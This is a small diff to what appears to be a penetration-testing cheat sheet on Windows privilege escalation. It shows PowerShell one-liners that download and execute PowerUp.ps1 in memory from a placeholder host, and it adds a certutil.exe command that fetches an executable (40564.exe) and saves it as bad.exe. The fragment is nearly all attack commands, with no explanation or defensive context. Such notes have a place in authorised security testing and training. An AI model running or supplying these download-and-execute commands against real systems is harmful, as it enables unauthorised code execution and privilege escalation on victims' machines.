@@ -34,6 +34,9 @@ IEX(New-Object Net.WebClient).DownloadString(‘http://<0.0.0.0>/PowerUp.ps1’)
 
 ## pwsh versio 3 and above
 iex (iwr 'http://<0.0.0.0>/PowerUp.ps1')
+
+## Without powershell
+certutil.exe -urlcache -f http://0.0.0.0/40564.exe bad.exe
 ```
 
 ## Pwsh in Memory Injection
